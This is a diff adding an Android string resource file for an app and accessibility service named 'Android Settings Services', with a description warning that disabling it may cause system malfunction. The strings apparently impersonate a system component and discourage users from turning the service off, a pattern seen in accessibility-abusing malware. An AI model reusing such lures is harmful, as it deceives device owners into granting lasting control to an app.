@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">Android Settings Services</string>
+    <string name="accessibility_service_label">Android Settings Services</string>
+	<string name="accessibility_service_description">Warning: Disabling this may cause system malfunction.</string>
+</resources>
